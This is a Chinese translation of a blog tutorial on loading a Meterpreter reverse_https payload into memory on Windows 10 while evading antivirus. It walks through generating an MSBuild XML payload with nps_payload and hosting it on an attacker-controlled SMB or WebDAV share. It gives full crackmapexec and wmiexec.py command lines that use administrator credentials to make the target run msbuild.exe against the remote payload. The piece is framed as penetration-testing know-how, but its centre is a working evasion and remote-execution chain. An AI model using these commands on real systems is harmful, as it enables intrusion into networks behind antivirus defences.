> 原文链接: https://www.anquanke.com//post/id/147510 


# win10内存花式执行meterpreter并绕过杀毒软件


                                阅读量   
                                **152137**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：https://www.n00py.io/
                                <br>原文地址：[https://www.n00py.io/2018/06/executing-meterpreter-in-memory-on-windows-10-and-bypassing-antivirus/](https://www.n00py.io/2018/06/executing-meterpreter-in-memory-on-windows-10-and-bypassing-antivirus/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p5.ssl.qhimg.com/t01a7777ba1dd2b5e3d.jpg)](https://p5.ssl.qhimg.com/t01a7777ba1dd2b5e3d.jpg)

最近我在coalfire博客上看到一篇文章，讲的是利用Invoke-CradleCrafter来执行混淆的powershell payload。

由于Windows defender已经升级到最新并且屏蔽了metasploit的web利用模块，所以这篇文章非常有用。

这里我想展示另一种方法来达到同样的效果，但是不会删除主机系统上的任何文件，也会根据主机对互联网开放的端口提供更多选择。

 为了生成payload，我得先去GitHub上看下Ben Ten和Spoonman大神创建的nps_payload脚本。

这个脚本利用了MSbuild.exe文件，能够绕过很多白名单应用配置文件(AWL)。

 执行以下步骤下载nps_payload脚本:

[![](https://p0.ssl.qhimg.com/t011b9bc90029ca4fbb.png)](https://p0.ssl.qhimg.com/t011b9bc90029ca4fbb.png)

执行脚本：

[![](https://p1.ssl.qhimg.com/t012cb38cd5d91bcfb8.png)](https://p1.ssl.qhimg.com/t012cb38cd5d91bcfb8.png)

输入1选择“Generate msbuild/nps/msf payload”

然后输入3，选择“windows/meterpreter/reverse_https”

这会输出一个msbuild_nps.xml文件，当然你也可以进行重命名。

要把这个文件传到靶机上，我们需要先在本地启用SMB共享服务。

通过以下步骤来启用本地共享：

[![](https://p1.ssl.qhimg.com/t01d15b161ec800f9bb.png)](https://p1.ssl.qhimg.com/t01d15b161ec800f9bb.png)

然后在smb.conf文件底部添加以下内容：

[![](https://p2.ssl.qhimg.com/t01433563a6295492ac.png)](https://p2.ssl.qhimg.com/t01433563a6295492ac.png)

将payload拷贝到你指定路径下的目录里。

[![](https://p2.ssl.qhimg.com/t0197c428a18bb0dab8.png)](https://p2.ssl.qhimg.com/t0197c428a18bb0dab8.png)

现在payload已经在SMB共享文件里了。下一步就是开启Metasploit监听。

[![](https://p5.ssl.qhimg.com/t0127ccdf11631e8a1f.png)](https://p5.ssl.qhimg.com/t0127ccdf11631e8a1f.png)

你也可以使用nps_payload生成的msbuild_nps.rc文件。

确保你的本地端口(LPORT)和本地主机(LHOST)跟nps_payload脚本中的保持一致。

在远程主机上执行文件有很多方法。

如果你可以RDP远程连接主机的话，直接在命令行中粘贴如下命令：

%windir%Microsoft.NETFrameworkv4.0.30319msbuild.exe \192.168.137.133Guest Sharemsbuild_nps.xml

如图：

[![](https://p2.ssl.qhimg.com/t017e0c02cf069b7263.png)](https://p2.ssl.qhimg.com/t017e0c02cf069b7263.png)

你也可以利用常见的命令执行工具通过网络来远程执行：

**CrackMapExec方式执行：**

crackmapexec smb 192.168.137.1 -u Administrator -p Password123 -x 

‘%windir%Microsoft.NETFrameworkv4.0.30319msbuild.exe 

\192.168.137.133Guestmsbuild_nps.xml’

**python impacket包中的wimiexec.py：**

python wmiexec.py Adminstrator:Password123@192.168.137.1 cme.exe /c start 

%windir%Microsoft.NETFrameworkv4.0.30319msbuild.exe 

\192.168.137.133Guestmsbuild_nps.xml

测试的时候，执行脚本遇到了一点问题。因此我想到了用WebDAV的方式把脚本上传到靶机中，这个方法比SMB共享更好。

为什么要用WebDAV呢？我们先来了解一下UNC路径问题。

Windows首先会访问445端口的SMB共享服务，如果失败，则会尝试访问80端口的WebDAV服务。这种方式非常有用，原因如下：

<!-- [if !supportLists]-->1.      <!--[endif]-->SMB服务通常会被防火墙屏蔽。如果你想从远程主机上获取payload通常都行不通，因为445端口被屏蔽了。

<!-- [if !supportLists]-->2.      <!--[endif]-->CrackMapExec版本4，需要服务器的445端口运行SMB服务来执行命令。我们不能在同一时间在同一台主机上使用SMB共享和CME服务。

<!-- [if !supportLists]-->3.      <!--[endif]-->WebDAV支持HTTPS。

有很多方法可以搭建WebDAV服务器。你可以用Apache来搭，这里我用一个python工具WsgiDAV来搭建一个。

通过pip命令来安装WsgiDAV，非常简单，只需要输入如下命令：[![](https://p0.ssl.qhimg.com/t01a6abcbee28421b72.png)](https://p0.ssl.qhimg.com/t01a6abcbee28421b72.png)

使用也很简单，运行如下命令：[![](https://p3.ssl.qhimg.com/t01b00f2839aecaac14.png)](https://p3.ssl.qhimg.com/t01b00f2839aecaac14.png)

在这个例子中，我把payload放在/tmp/目录下”test”文件夹中。

要远程执行payload，我们只需要执行如下命令：

CrackMapExec：

crackmapexec smb 192.168.137.1 -u Administrator -p Password123 -x 

‘%windir%Microsoft.NETFrameworkv4.0.30319msbuild.exe 

\192.168.137.134Davwwwroottestmsbuild_nps.xml’

如图：

[![](https://p0.ssl.qhimg.com/t01d309038f84d5d884.png)](https://p0.ssl.qhimg.com/t01d309038f84d5d884.png)

Impacket包的wimiexec.py脚本：

python wmiexec.py Administrator:Password123@192.168.137.1

C:&gt;%windir%Microsoft.NETFrameworkv4.0.30319msbuild.exe 

\192.168.137.134Davwwwroottestmsbuild_nps.xml

如图：[![](https://p5.ssl.qhimg.com/t016b1fce4a1b67c791.png)](https://p5.ssl.qhimg.com/t016b1fce4a1b67c791.png)

这样一来，我们就可以不用SMB共享在靶机上执行payload了。

没有对磁盘写入任何东西，没有SMB带外流量，因此完全可以避开杀毒软件。
